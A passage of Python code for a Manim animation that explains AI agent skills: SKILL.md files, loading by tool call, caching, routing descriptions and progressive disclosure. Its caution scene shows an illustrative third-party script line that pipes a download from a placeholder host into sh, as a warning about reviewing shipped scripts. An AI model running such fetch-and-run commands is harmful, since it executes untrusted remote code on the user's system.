        spec = [("1 · front matter", "the catalog line", ORCHID, ORCHID_FILL),
                ("2 · body", "when the skill is loaded", MINT, MINT_FILL),
                ("3 · sub-documents", "only if the body points there", SUN, SUN_FILL)]
        for i, (head, sub, color, fill) in enumerate(spec):
            w = 3.2 + 0.55 * i
            box = card(w, 1.05, color, fill, radius=0.16, stroke=2)
            words = m.VGroup(text(head, 26, INK, weight=m.BOLD), text(sub, 20, MUTED)).arrange(m.DOWN, buff=0.08, aligned_edge=m.LEFT)
            words.move_to(box).align_to(box, m.LEFT).shift(0.3 * m.RIGHT)
            layers.add(m.VGroup(box, words))
        layers.arrange(m.DOWN, buff=0.22, aligned_edge=m.LEFT).move_to([-4.55, -0.2, 0]).align_to([-6.6, 0, 0], m.LEFT)
        copyright_ = text("like a book's copyright page", 22, ORCHID).next_to(layers, m.UP, buff=0.3).align_to(layers, m.LEFT)
        src = cite("Li, AI Agents in Depth · ch. 2").next_to(layers, m.DOWN, buff=0.3).align_to(layers, m.LEFT)

        self.say(
            "[Each skill is a folder in the repo], [with one markdown file at its heart.]",
            m.AnimationGroup(self.new_header("03 · the file", "One folder, one SKILL.md"), m.FadeIn(tree, lag_ratio=0.05)),
            m.Circumscribe(rows["SKILL"], color=SUN, buff=0.08),
        )
        self.say(
            "[It opens with YAML front matter, between three dashes]: [a name], [and a description.]",
            m.AnimationGroup(m.FadeIn(md.box), m.FadeIn(md.cap), m.FadeIn(head_lines, shift=0.1 * m.UP), m.FadeIn(fm_bar)),
            m.Circumscribe(md.part(1, "name: release"), color=AZURE, buff=0.06),
            m.Circumscribe(m.VGroup(*md.lines[2:n_head]), color=AZURE, buff=0.06),
        )
        self.say(
            "[Below it is the body]: [the procedure itself, step by step.]",
            m.AnimationGroup(m.FadeIn(body_lines[:-1], shift=0.1 * m.UP), m.FadeIn(body_bar)),
            m.Circumscribe(m.VGroup(*md.lines[n_head + 2:n_head + 6]), color=SUN, buff=0.08),
        )
        self.say(
            "[The folder can also hold references and scripts], [used only when the body points to them.]",
            m.AnimationGroup(m.Circumscribe(m.VGroup(rows["references"], rows["hotfix"]), color=SUN, buff=0.06),
                             m.Circumscribe(m.VGroup(rows["scripts"], rows["bump"]), color=SUN, buff=0.06)),
            m.AnimationGroup(m.FadeIn(body_lines[-1], shift=0.1 * m.UP), m.Circumscribe(md.lines[ref_line], color=SUN, buff=0.06)),
        )
        self.say(
            "[So a skill has three layers]: [the front matter, like a book's copyright page], [the body], [and the sub-documents.]",
            m.AnimationGroup(m.FadeOut(tree, shift=0.2 * m.LEFT), m.FadeIn(src)),
            m.AnimationGroup(m.FadeIn(layers[0], shift=0.2 * m.RIGHT), m.FadeIn(copyright_), m.Circumscribe(fm_bar, color=ORCHID, buff=0.02)),
            m.AnimationGroup(m.FadeIn(layers[1], shift=0.2 * m.RIGHT), m.Circumscribe(body_bar, color=MINT, buff=0.02)),
            m.AnimationGroup(m.FadeIn(layers[2], shift=0.2 * m.RIGHT), m.Circumscribe(md.lines[ref_line], color=SUN, buff=0.06)),
        )
        self.wait(0.3)
        self.clear()

    # ------------------------------------------------------------------ the harness

    def harness(self):
        self.next_section("4 · The harness", notes="What Episode 10 adds to harness_reference.py, written in its style (and run by this scene): scan_skills reads every skills/<name>/SKILL.md once at start-up; the catalog (one '- name: description' line per skill) is appended to SYSTEM; load_skill(name) returns the body from the registry (learn-claude-code s07 looks the name up in its registry, not the file system); one schema in TOOLS + one handler in TOOL_HANDLERS (Episode 3) — agent_loop is unchanged.")
        cc = CodeCard(ADD_SRC, title="harness · what skills add", size=20)
        cc.group.move_to([-3.4, 0.45, 0])
        s_body = code(LOAD_SKILL_SRC, 19, INK, t2c={r"\"[^\"\n]*\"(?=\s*:)": AZURE, r"\"[^\"\n]*\"": MINT})
        s_cap = code("LOAD_SKILL", 20, SUN, weight=m.BOLD)
        s_inner = m.VGroup(s_cap, s_body).arrange(m.DOWN, buff=0.22, aligned_edge=m.LEFT)
        s_box = card(s_inner.width + 0.7, s_inner.height + 0.55, SUN, CARD, radius=0.16, stroke=2).move_to(s_inner)
        schema = m.VGroup(s_box, s_inner).move_to([3.55, 0.75, 0]).align_to(cc.box, m.UP).align_to([6.7, 0, 0], m.RIGHT)
        same = pill("agent_loop · unchanged", MINT, MINT_FILL, 22, mono=True).next_to(schema, m.DOWN, buff=0.45)
        bar = cc.bar(0, 1)
        ep3 = cite("one schema + one handler · Episode 3").next_to(same, m.DOWN, buff=0.25)

        self.say(
            "[In the harness, loading a skill is just one more tool.]",
            m.AnimationGroup(self.new_header("04 · the harness", "Loading is just a tool"), m.FadeIn(cc.group, shift=0.2 * m.UP)),
        )
        self.say(
            "[At start-up, it scans the skills folder], [and appends the catalog to the system prompt.]",
            m.AnimationGroup(m.FadeIn(bar), m.Circumscribe(cc.part(0, 'scan_skills("skills")'), color=SUN, buff=0.05)),
            m.Circumscribe(cc.part(1, "catalog(SKILLS)"), color=ORCHID, buff=0.05),
        )
        self.say(
            "[The handler, load skill, returns a body by name.]",
            m.AnimationGroup(m.Transform(bar, cc.bar(3, 4)), m.Circumscribe(cc.part(4, 'SKILLS[name]["body"]'), color=MINT, buff=0.05)),
        )
        self.say(
            "[Add its schema and its handler], [and the loop itself stays the same.]",
            m.AnimationGroup(m.Transform(bar, cc.bar(6, 7)), m.FadeIn(schema, target_position=cc.lines[6])),
            m.AnimationGroup(m.FadeIn(same, scale=1.1), m.FadeIn(ep3)),
        )
        self.wait(0.3)
        self.clear()

    # ------------------------------------------------------------------ the run

    def run(self):
        self.next_section("5 · The run", notes=f"harness_reference.agent_loop (unchanged) run against a scripted model: {len(SENT)} calls, {len(MESSAGES)} messages; call 1 is load_skill(name='release') and its tool_result is the body of skills/release/SKILL.md; then the body's four steps in order: pytest -q → {RESULTS[1]!r}, edit tinyshop/__init__.py (1.3.2 → {NEW}), edit CHANGELOG.md (Unreleased → {NEW}), git tag v{NEW}. The system prompt (with the catalog) is identical on every call (asserted). Token sizes per learn-claude-code s07's estimates: {RESIDENT} resident → {fmt(LOADED)} after loading. The model's choices are illustrative.")
        # right: the context window = a fixed system prompt + the scrolling messages
        cx, cw = 3.6, 6.3
        sys_lines = ["Skills:"] + [short(l, 37) for l in catalog(SKILLS).split("\n")]
        sys_body = code("\n".join(sys_lines), 20, INK, t2c={r"^- [a-z-]+(?=:)": ORCHID, r"^Skills:": MUTED})
        sys_panel = card(cw, sys_body.height + 0.5, ORCHID, PANEL, radius=0.2, stroke=2)
        sys_panel.move_to([cx, 2.2 - sys_panel.height / 2, 0])
        sys_body.move_to(sys_panel).align_to(sys_panel, m.LEFT).shift(0.3 * m.RIGHT)
        sys_t = code("system prompt", 20, ORCHID, weight=m.BOLD).next_to(sys_panel, m.UP, buff=0.12).align_to(sys_panel, m.LEFT)
        release_row = sys_body[len("Skills:"):len("Skills:") + len(sys_lines[1].replace(" ", ""))]
        meter = Meter(1.3, RESIDENT / EVERYTHING, SUN, 0.16)
        tok = Slot(self)

        top = sys_panel.get_bottom()[1] - 0.45
        bottom = -3.55
        ctx = Column(center=(cx, (top + bottom) / 2, 0), width=cw, height=top - bottom, title="messages", gap=0.1)
        meter.move_to(ctx.title).align_to(ctx.panel, m.RIGHT)
        tok_at = lambda n: code(f"≈{fmt(n)} skill tokens", 20, SUN).next_to(meter, m.LEFT, buff=0.2).align_to(ctx.title, m.DOWN)  # noqa: E731

        # left: model, harness, the skill on disk, the checklist
        model = side_chip(MODEL_ICON, "model", CORAL, CORAL_FILL).move_to([-5.05, 1.95, 0])
        harn = side_chip(GEAR_ICON, "harness", EDGE, CARD).move_to([-1.75, 1.95, 0])
        def bodyline(i):
            return RELEASE_BODY.split("\n")[i]

        result_body = "\n".join([bodyline(0)] + [short(bodyline(i), 34) for i in (1, 2, 3, 4)])
        preview = code(result_body, 20, FAINT)
        disk_words = m.VGroup(code("skills/release/SKILL.md", 22, INK), text(f"on disk · ≈{fmt(BODY_TOKENS)} tokens", 20, MUTED), preview)
        disk_words.arrange(m.DOWN, buff=0.12, aligned_edge=m.LEFT)
        disk_words[2].shift(0.12 * m.DOWN)
        disk = card(5.8, disk_words.height + 0.55, EDGE, CARD, radius=0.16, stroke=2).move_to([-3.4, -0.75, 0])
        disk_words.move_to(disk).align_to(disk, m.LEFT).shift(0.35 * m.RIGHT)
        disk_g = m.VGroup(disk, disk_words)
        steps = [("pytest -q", RESULTS[1]), ("__version__", f'"1.3.2" → "{NEW}"'), ("CHANGELOG.md", f"Unreleased → {NEW}"), ("git tag", f"v{NEW}")]
        checklist = m.VGroup()
        for i, (what, res) in enumerate(steps, start=1):
            box = card(5.8, 0.6, EDGE, CARD, radius=0.12, stroke=1.5)
            num = code(f"{i}.", 20, SUN).move_to(box).align_to(box, m.LEFT).shift(0.25 * m.RIGHT)
            w = code(what, 20, INK).next_to(num, m.RIGHT, buff=0.2)
            r = code(res, 20, MINT).move_to(box).align_to(box, m.RIGHT).shift(0.25 * m.LEFT)
            for t in (w, r):
                t.shift((num[0].get_bottom()[1] - t[0].get_bottom()[1]) * m.UP)
            checklist.add(m.VGroup(box, num, w, r))
        checklist.arrange(m.DOWN, buff=0.12).move_to([-3.4, -2.05, 0])
        from_body = code("from the skill's body", 20, MUTED).next_to(checklist, m.UP, buff=0.14).align_to(checklist, m.LEFT)

        # messages
        u = ctx.message("user", TASK, size=22)
        call0 = CALLS[0]
        tu = ctx.message("tool_use", f'{call0.name}(name="{call0.input["name"]}")', size=22, mono=True)
        tr = ctx.message("tool_result", result_body, size=22, mono=True)

        def call_text(c):
            if c.name == "bash":
                return f'bash("{c.input["command"]}")'
            return f'edit_file("{c.input["path"]}")'

        pairs = [(ctx.message("tool_use", call_text(c), size=22, mono=True), ctx.message("tool_result", r, size=22, mono=True))
                 for c, r in zip(CALLS[1:], RESULTS[1:])]
        done = ctx.message("assistant", FINAL, size=22)
        ok = pill(f"released v{NEW}", MINT, MINT_FILL, 22).next_to(harn, m.DOWN, buff=0.3).align_to(harn, m.RIGHT)

        self.say(
            "[Back to Otto.] [Its system prompt carries the catalog], [and you ask it to cut the release.]",
            m.AnimationGroup(self.new_header("05 · the run", "Otto learns to release"), m.FadeIn(model, shift=0.15 * m.UP), m.FadeIn(harn, shift=0.15 * m.UP)),
            m.AnimationGroup(m.FadeIn(sys_panel), m.FadeIn(sys_t), m.FadeIn(sys_body, shift=0.1 * m.UP), m.FadeIn(meter), tok.to(tok_at(RESIDENT))),
            m.AnimationGroup(m.FadeIn(ctx.frame), ctx.push(u), m.FadeIn(disk_g, shift=0.15 * m.UP)),
        )
        self.say(
            "[The model reads the catalog], [and the release line matches the task.]",
            m.AnimationGroup(m.Circumscribe(model, color=CORAL, buff=0.06), m.Circumscribe(sys_panel, color=ORCHID, buff=0.05)),
            m.AnimationGroup(release_row.animate.set_color(SUN), m.Circumscribe(release_row, color=SUN, buff=0.06)),
        )
        self.say(
            "[So it calls load skill], [with the name release.]",
            m.AnimationGroup(ctx.push(tu, source=model), m.Circumscribe(model, color=SUN, buff=0.06)),
            m.Circumscribe(tu[2][1], color=SUN, buff=0.06),
        )
        self.say(
            "[The harness looks up the skill's body], [and returns it as a tool result.]",
            m.AnimationGroup(m.Circumscribe(harn, color=MUTED, buff=0.06), disk.animate.set_stroke(MINT), preview.animate.set_color(INK)),
            ctx.push(tr, run_time=1.1, source=preview),
        )
        self.say(
            "[About two thousand tokens join the context], [once, right when they're needed.]",
            m.AnimationGroup(meter.fill_to(LOADED / EVERYTHING), tok.to(tok_at(LOADED))),
            m.Circumscribe(tr, color=MINT, buff=0.05),
        )
        anims = []
        for k, (call_m, res_m) in enumerate(pairs):
            anims.append(m.AnimationGroup(
                m.AnimationGroup(ctx.push(call_m, run_time=0.5), ctx.push(res_m, run_time=0.5), lag_ratio=0.6),
                m.FadeIn(checklist[k], shift=0.15 * m.UP),
                *([m.FadeIn(from_body)] if k == 0 else []),
            ))
        self.say(
            "[Then Otto follows the steps]: [it runs the tests], [bumps the version], [updates the changelog], [and tags the release.]",
            m.FadeOut(disk_g, shift=0.15 * m.UP),
            *anims,
        )
        self.say(
            "[Released.] [The full procedure stayed out of the context], [until the one task that needed it.]",
            m.AnimationGroup(ctx.push(done), m.FadeIn(ok, scale=1.1)),
            m.Circumscribe(m.VGroup(meter, tok.current), color=SUN, buff=0.08),
            m.Circumscribe(checklist, color=MINT, buff=0.08),
        )
        self.wait(0.3)
        self.clear()

    # ------------------------------------------------------------------ why a tool result

    def why_tool_result(self):
        self.next_section("6 · Why a tool result", notes="learn-claude-code · s07: 'Inject via tool_result, not system prompt'. Prompt caching (Episode 7) reuses the prompt only up to the first change: splicing the body into the system prompt mid-session changes the prefix and everything after it is processed again; appending it as a tool result keeps the prefix intact. Li, AI Agents in Depth, ch. 2: Claude Code appends the body as a user message at the invocation point (also at the end); 'KV Cache-friendly does not mean zero cost'. Block widths are schematic.")
        x0 = -3.45
        h = 0.82

        def row(parts, y):
            g = m.VGroup()
            for label, w, color, fill in parts:
                g.add(strip_block(w, label, color, fill, height=h))
            g.arrange(m.RIGHT, buff=0.12).move_to([0, y, 0]).align_to([x0, 0, 0], m.LEFT)
            return g

        SYS = ("system · catalog", 3.0, ORCHID, ORCHID_FILL)
        USER = ("user", 1.25, AZURE, AZURE_FILL)
        CALL = ("tool_use", 1.6, SUN, SUN_FILL)
        base = row([SYS, USER, CALL], 1.6)
        b_lab = text("so far", 24, MUTED).next_to(base, m.LEFT, buff=0.35)
        cached = span_bracket(base.get_left()[0], base.get_right()[0], base.get_top()[1] + 0.22, MINT, "cached prefix")
        ep7 = cite("see Episode 7").next_to(base, m.RIGHT, buff=0.4)

        a_sys = SYS
        a_body = ("body", 1.5, ROSE, ROSE_FILL)
        row_a = row([a_sys, a_body, USER, CALL], -0.3)
        a_lab = text("in the system prompt", 24, ROSE).next_to(row_a, m.LEFT, buff=0.35)
        # the user and tool_use blocks after the splice must be processed again
        redo = span_bracket(row_a[1].get_left()[0], row_a[3].get_right()[0], row_a.get_bottom()[1] - 0.22, ROSE, "processed again", up=False)
        keep_a = span_bracket(row_a[0].get_left()[0], row_a[0].get_right()[0], row_a.get_top()[1] + 0.22, MINT, "cached")
        for blk in row_a[2:]:
            blk[0].set_stroke(ROSE)

        row_b = row([SYS, USER, CALL, ("tool_result · body", 3.35, MINT, MINT_FILL)], -2.45)
        b2_lab = text("as a tool result", 24, MINT).next_to(row_b, m.LEFT, buff=0.35)
        keep_b = span_bracket(row_b[0].get_left()[0], row_b[2].get_right()[0], row_b.get_top()[1] + 0.22, MINT, "cached prefix")
        new_b = code("new", 22, MINT, weight=m.BOLD).next_to(row_b[3], m.UP, buff=0.12).align_to(keep_b[1], m.DOWN)
        rule = text("“Inject via tool_result, not system prompt.”", 28, INK)
        src = cite("learn-claude-code · s07")
        m.VGroup(rule, src).arrange(m.RIGHT, buff=0.35, aligned_edge=m.DOWN).move_to([0, -3.45, 0])

        self.say(
            "[Why send the body as a tool result], [and not add it to the system prompt?]",
            m.AnimationGroup(self.new_header("06 · tool result", "Append, don't splice"), m.FadeIn(base, lag_ratio=0.2), m.FadeIn(b_lab)),
            m.Circumscribe(base[0], color=ORCHID, buff=0.06),
        )
        self.say(
            "[Recall episode seven]: [the cache reuses a prompt only up to its first change.]",
            m.FadeIn(ep7),
            m.AnimationGroup(m.Create(cached[0]), m.FadeIn(cached[1])),
        )
        self.say(
            "[Splice the body into the system prompt], [and everything after it must be processed again.]",
            m.AnimationGroup(m.FadeIn(a_lab), m.FadeIn(row_a[0]), m.FadeIn(row_a[1], target_position=base[0].get_right()), m.FadeIn(row_a[2:], shift=0.3 * m.RIGHT), m.FadeIn(keep_a)),
            m.AnimationGroup(m.Create(redo[0]), m.FadeIn(redo[1])),
        )
        self.say(
            "[Append it as a tool result instead], [and the whole prefix stays cached.]",
            m.AnimationGroup(m.FadeIn(b2_lab), m.FadeIn(row_b[:3]), m.FadeIn(row_b[3], shift=0.4 * m.LEFT), m.FadeIn(new_b)),
            m.AnimationGroup(m.Create(keep_b[0]), m.FadeIn(keep_b[1])),
        )
        self.say(
            "[As Learn Claude Code puts it]: [inject through the tool result, not the system prompt.]",
            m.FadeIn(src),
            m.Write(rule),
        )
        self.wait(0.3)
        self.clear()

    # ------------------------------------------------------------------ routing

    def routing(self):
        self.next_section("7 · Descriptions route", notes="The model chooses a skill from the catalog alone, so each description is a routing rule. Li, AI Agents in Depth, ch. 2: state 'Use when' and 'Do not use when'; 'help with backend' can activate on almost any backend task. The three tasks and the routing shown are illustrative.")
        tasks = m.VGroup(*[word_chip(t, AZURE, AZURE_FILL, size=24, pad=0.6) for t in ("cut a release", "fix the cart total", "add an API endpoint")])
        tasks.arrange(m.DOWN, buff=0.55, aligned_edge=m.LEFT).move_to([-4.6, -0.1, 0])
        t_cap = text("tasks", 24, MUTED).next_to(tasks, m.UP, buff=0.3).align_to(tasks, m.LEFT)

        bad_src = "name: backend\ndescription: help with backend"
        good_src = RELEASE_MD.split("---\n")[1].rstrip("\n")
        assert "Use when" in good_src and "Do not" in good_src
        bad = CodeCard(bad_src, title="SKILL.md · vague", size=20, t2c=MD_T2C)
        good = CodeCard(good_src, title="SKILL.md · a routing rule", size=20, t2c=MD_T2C)
        bad.box.set_stroke(ROSE)
        good.box.set_stroke(MINT)
        good.group.move_to([2.9, -0.1, 0]).align_to([6.7, 0, 0], m.RIGHT)
        bad.group.move_to([2.9, -0.1, 0])
        target_l = good.box.get_left()[0]
        bad.group.align_to([target_l, 0, 0], m.LEFT)

        def link(task, card_, color, i):
            end = [card_.box.get_left()[0], card_.box.get_y() + 0.45 * (1 - i), 0]
            return arrow(task.get_right(), end, color, buff=0.12)

        def straight(task, card_, color):
            return arrow(task.get_right(), [card_.box.get_left()[0], task.get_y(), 0], color, buff=0.12)

        bad_links = m.VGroup(*[link(t, bad, ROSE, i) for i, t in enumerate(tasks)])
        good_link = straight(tasks[0], good, MINT)
        b_note = text("fires on almost any backend task", 24, ROSE).next_to(bad.box, m.DOWN, buff=0.35)
        src = cite("Li, AI Agents in Depth · ch. 2").to_corner(m.DR, buff=0.4)
        when_use = good.part(1, "Use when")
        when_not = good.part(2, "Do not")
        g_note = text("only the release task gets through", 24, MINT).next_to(good.box, m.DOWN, buff=0.35)
        nope = m.VGroup(*[code("no skill", 20, MUTED).next_to(t, m.RIGHT, buff=0.35) for t in tasks[1:]])

        self.say(
            "[The model picks a skill by reading the descriptions], [so each description is a routing rule.]",
            m.AnimationGroup(self.new_header("07 · descriptions", "Descriptions are routing rules"), m.FadeIn(t_cap), m.FadeIn(tasks, lag_ratio=0.2)),
            m.FadeIn(bad.group, shift=0.15 * m.LEFT),
        )
        self.say(
            "[AI Agents in Depth warns against vague ones, like help with backend]: [it fires on almost any backend task.]",
            m.AnimationGroup(m.Circumscribe(bad.lines[1], color=ROSE, buff=0.06), m.FadeIn(src)),
            m.AnimationGroup(m.LaggedStart(*[m.GrowArrow(a) for a in bad_links], lag_ratio=0.25), m.FadeIn(b_note, shift=0.1 * m.UP)),
        )
        self.say(
            "[A good one says when to use the skill], [and when not to.]",
            m.AnimationGroup(m.FadeOut(bad.group, shift=0.2 * m.DOWN), m.FadeOut(bad_links), m.FadeOut(b_note), m.FadeIn(good.group, shift=0.2 * m.DOWN)),
            m.AnimationGroup(m.Circumscribe(when_use, color=MINT, buff=0.06), m.Circumscribe(when_not, color=ROSE, buff=0.06)),
        )
        self.say(
            "[Now only the release task is routed to the release skill.]",
            m.AnimationGroup(m.GrowArrow(good_link), m.FadeIn(nope), m.FadeIn(g_note, shift=0.1 * m.UP), m.Circumscribe(tasks[0], color=MINT, buff=0.06)),
        )
        self.wait(0.3)
        self.clear()

    # ------------------------------------------------------------------ caution

    def caution(self):
        self.next_section("8 · A caution", notes="Li, AI Agents in Depth, ch. 10: 'a Skill is an instruction, not a permission boundary' — sensitive tools still need a gate enforced in code (permissions: Episode 17). ch. 4: a Skill that ships scripts 'adds a whole class of risk' (malicious code, supply chain); assess provenance, where it runs, sandboxing and approval — said here as 'review it like code you're about to run'. The 'never push to main' line and the setup script are illustrative.")
        stmt = title_text("A skill is an instruction,\nnot a permission boundary.", 46, INK)
        stmt.move_to([0, 1.75, 0])
        src = cite("Li, AI Agents in Depth · ch. 10").next_to(stmt, m.DOWN, buff=0.22)

        rule = CodeCard("# Releasing tinyshop\nNever push to main.", title="SKILL.md", size=22, t2c=MD_T2C)
        rule.group.move_to([-4.6, -0.95, 0])
        call = mono_chip('bash("git push origin main")', SUN, SUN_FILL, size=22, pad=0.5).move_to([-4.6, -2.65, 0])
        a1 = arrow(rule.box.get_bottom(), call.get_top(), MUTED, buff=0.1)
        runs = code("runs anyway", 20, ROSE, weight=m.BOLD).next_to(call, m.DOWN, buff=0.2)
        gate = m.VGroup(icon("lock", 0.62), text("a check in\nthe harness", 24, INK, weight=m.SEMIBOLD)).arrange(m.RIGHT, buff=0.22)
        gate.move_to([-1.25, -1.75, 0])
        ep17 = cite("Episode 17").next_to(gate, m.DOWN, buff=0.2).align_to(gate[1], m.LEFT)
        blocked = code("blocked", 20, MINT, weight=m.BOLD).move_to(runs)

        third = CodeCard("#!/bin/sh\ncurl -s https://x.example/i.sh | sh", title="scripts/setup.sh · third-party", size=20)
        third.group.move_to([4.0, -0.95, 0]).align_to([6.75, 0, 0], m.RIGHT)
        third.lines[1].set_color(ROSE)
        review = m.VGroup(icon("search", 0.6), text("review it like code you're about to run", 24, INK, weight=m.SEMIBOLD)).arrange(m.RIGHT, buff=0.25)
        review.next_to(third.group, m.DOWN, buff=0.45).align_to(third.group, m.RIGHT)
        src4 = cite("Li, AI Agents in Depth · ch. 4").next_to(review, m.DOWN, buff=0.18).align_to(review, m.RIGHT)

        self.say(
            "[One caution]: [a skill is an instruction, not a permission boundary.]",
            self.new_header("08 · caution", "Instructions, not permissions"),
            m.AnimationGroup(m.FadeIn(stmt, shift=0.15 * m.UP), m.FadeIn(src)),
        )
        self.say(
            "[A line in a skill saying never push to main] [won't stop a push.] [Only a check in the harness can], [as episode seventeen shows.]",
            m.FadeIn(rule.group, shift=0.15 * m.UP),
            m.AnimationGroup(m.GrowArrow(a1), m.FadeIn(call, shift=0.15 * m.DOWN), m.FadeIn(runs)),
            m.AnimationGroup(m.FadeIn(gate, shift=0.15 * m.LEFT), m.FadeOut(runs), m.FadeIn(blocked), m.Circumscribe(call, color=MINT, buff=0.06)),
            m.FadeIn(ep17, shift=0.1 * m.UP),
        )
        self.say(
            "[And a skill from someone else can ship scripts], [so review it like code you're about to run.]",
            m.FadeIn(third.group, shift=0.15 * m.LEFT),
            m.AnimationGroup(m.FadeIn(review, shift=0.1 * m.UP), m.FadeIn(src4), m.Circumscribe(third.lines[1], color=ROSE, buff=0.06)),
        )
        self.wait(0.3)
        self.clear()

    # ------------------------------------------------------------------ the pattern

    def pattern(self):
        self.next_section("9 · Progressive disclosure", notes="Li, AI Agents in Depth, ch. 1: progressive disclosure is one of the book's five recurring patterns — 'offer a searchable catalogue first and load the details on demand'; it recurs in deferred tool loading (Episode 16) and in knowledge bases (ch. 3, OpenViking: L0 ≈ 100 / L1 ≈ 2,000 tokens / L2 full text; Episode 14). learn-claude-code · s07: on-demand loading solves \"don't carry what you shouldn't\", compact solves \"how to drop what you should\" (Episode 11).")
        spec = [("catalog", f"≈{CATALOG_TOKENS} tokens", "always", ORCHID, ORCHID_FILL, 1.6),
                ("body", f"≈{fmt(BODY_TOKENS)} tokens", "on demand", MINT, MINT_FILL, 2.25),
                ("sub-documents", "full detail", "if needed", SUN, SUN_FILL, 2.9)]
        steps = m.VGroup()
        for name, size_, when, color, fill, hgt in spec:
            box = card(2.8, hgt, color, fill, radius=0.18, stroke=2.5)
            words = m.VGroup(text(name, 24, INK, weight=m.BOLD), code(size_, 20, color), text(when, 22, MUTED)).arrange(m.DOWN, buff=0.1)
            words.move_to(box).align_to(box, m.UP).shift(0.25 * m.DOWN)
            steps.add(m.VGroup(box, words))
        steps.arrange(m.RIGHT, buff=0.42, aligned_edge=m.DOWN).move_to([-2.2, -0.45, 0])
        hop_y = steps.get_bottom()[1] + 0.5
        hops = m.VGroup(*[arrow([a[0].get_right()[0], hop_y, 0], [b[0].get_left()[0], hop_y, 0], MUTED, buff=0.04) for a, b in zip(steps, steps[1:])])
        src = cite("Li, AI Agents in Depth · ch. 1").to_corner(m.UR, buff=0.5).shift(0.08 * m.DOWN)
        five = text("one of the book's five patterns", 24, MUTED).next_to(steps, m.DOWN, buff=0.3).align_to(steps, m.LEFT)

        again = m.VGroup()
        for name, ep in (("skills", 10), ("tool catalogs", 16), ("knowledge bases", 14)):
            accent = MODULES[EPISODES[ep][1]][1]
            box = card(3.75, 0.72, EDGE, CARD, radius=0.16, stroke=2)
            body = m.VGroup(text(name, 24, INK, weight=m.SEMIBOLD), code(f"ep {ep}", 20, accent, weight=m.BOLD)).arrange(m.RIGHT, buff=0.3)
            again.add(m.VGroup(box, body.move_to(box)))
        again.arrange(m.DOWN, buff=0.22).move_to([4.8, -0.35, 0])
        a_cap = text("the same idea in", 24, MUTED).next_to(again, m.UP, buff=0.25).align_to(again, m.LEFT)

        q1 = m.VGroup(title_text("On-demand loading:", 36, MINT), text("don't carry what you shouldn't.", 34, INK)).arrange(m.RIGHT, buff=0.3)
        q2 = m.VGroup(title_text("Compaction:", 36, SUN), text("how to drop what you should.", 34, INK)).arrange(m.RIGHT, buff=0.3)
        quote = m.VGroup(q1, q2).arrange(m.DOWN, buff=0.45, aligned_edge=m.LEFT).move_to([0, 0.75, 0])
        for q in (q1, q2):
            q[1].shift((q[0][0].get_bottom()[1] - baseline(q[1], "don")) * m.UP)
        q_src = cite("learn-claude-code · s07").next_to(quote, m.DOWN, buff=0.35).align_to(quote, m.RIGHT)
        stays = text("a loaded body stays in the history", 26, MUTED).move_to([0, 2.15, 0])
        nxt = pill("Episode 11 · Compaction", SUN, SUN_FILL, 24).move_to([0, -2.1, 0])

        self.say(
            "[This idea is called progressive disclosure]: [show a short catalog first], [then load the details on demand.]",
            m.AnimationGroup(self.new_header("09 · the pattern", "Progressive disclosure"), m.FadeIn(src)),
            m.FadeIn(steps[0], shift=0.2 * m.UP),
            m.AnimationGroup(m.GrowArrow(hops[0]), m.FadeIn(steps[1], shift=0.2 * m.UP), m.GrowArrow(hops[1]), m.FadeIn(steps[2], shift=0.2 * m.UP), lag_ratio=0.3),
        )
        self.say(
            "[AI Agents in Depth counts it among five patterns that run through the whole book.] [You'll meet it again], [in tool catalogs], [and in knowledge bases.]",
            m.FadeIn(five, shift=0.1 * m.UP),
            m.AnimationGroup(m.FadeIn(a_cap), m.FadeIn(again[0], shift=0.15 * m.LEFT)),
            m.FadeIn(again[1], shift=0.15 * m.LEFT),
            m.FadeIn(again[2], shift=0.15 * m.LEFT),
        )
        self.say(
            "[But a loaded body stays in the history.] [As Learn Claude Code puts it], [on-demand loading means: don't carry what you shouldn't.]",
            m.AnimationGroup(m.FadeOut(m.VGroup(steps, hops, five, again, a_cap, src), shift=0.2 * m.DOWN), m.FadeIn(stays, shift=0.1 * m.DOWN)),
            m.FadeIn(q_src),
            m.FadeIn(q1, shift=0.15 * m.UP),
        )
        self.say(
            "[Compaction is the other half]: [how to drop what you should.] [That's episode eleven.]",
            m.FadeIn(q2[0], shift=0.15 * m.UP),
            m.FadeIn(q2[1], shift=0.15 * m.UP),
            m.FadeIn(nxt, scale=0.85),
        )
        self.wait(0.3)
        self.clear()

    # ------------------------------------------------------------------ recap

    def recap(self):
        self.next_section("Recap", notes="Describe (front matter → catalog line), load (load_skill → tool_result), follow (the body's steps).")
        halo = glow(SUN, radius=4.0)
        words = m.VGroup(*[title_text(w, 72, c) for w, c in (("Describe", ORCHID), ("Load", SUN), ("Follow", MINT))])
        subs = m.VGroup(*[code(s, 20, MUTED) for s in ("name + description", "load_skill → tool_result", "the body's steps")])
        slots = [max(w.width, s.width) for w, s in zip(words, subs)]
        x, gap = 0.0, 1.0
        for w, s, slot in zip(words, subs, slots):
            w.move_to([x + slot / 2, 0, 0])
            s.move_to([x + slot / 2, 0, 0])
            x += slot + gap
        on_baseline(words)
        line_y = min(w.get_bottom()[1] for w in words) - 0.45
        for s in subs:
            s.set_y(line_y)
        mid = words[1][0].get_center()[1]
        dots = m.VGroup(*[m.Dot([(a.get_right()[0] + b.get_left()[0]) / 2, mid, 0], radius=0.07, color=MUTED) for a, b in zip(words, words[1:])])
        row_ = m.VGroup(words, dots, subs).move_to(0.45 * m.UP)
        tagline = on_baseline(m.VGroup(text("Carry a short catalog.", 30, MUTED), text("Load the knowledge only when the task needs it.", 30, MUTED)).arrange(m.RIGHT, buff=0.22))
        tagline.next_to(row_, m.DOWN, buff=0.7)

        self.say(
            "[To sum up]: [describe], [load], [follow.]",
            m.AnimationGroup(self.drop_header(), m.FadeIn(halo, scale=0.6)),
            m.AnimationGroup(m.FadeIn(words[0], shift=0.3 * m.UP), m.FadeIn(subs[0])),
            m.AnimationGroup(m.FadeIn(dots[0]), m.FadeIn(words[1], shift=0.3 * m.UP), m.FadeIn(subs[1])),
            m.AnimationGroup(m.FadeIn(dots[1]), m.FadeIn(words[2], shift=0.3 * m.UP), m.FadeIn(subs[2])),
        )
        self.say("[Carry a short catalog], [and load the knowledge only when the task needs it.]",
                 m.FadeIn(tagline[0], shift=0.1 * m.UP), m.FadeIn(tagline[1], shift=0.1 * m.UP))
        self.wait(0.6)
        self.play(*[m.FadeOut(mob) for mob in (halo, row_, tagline)], run_time=0.9)
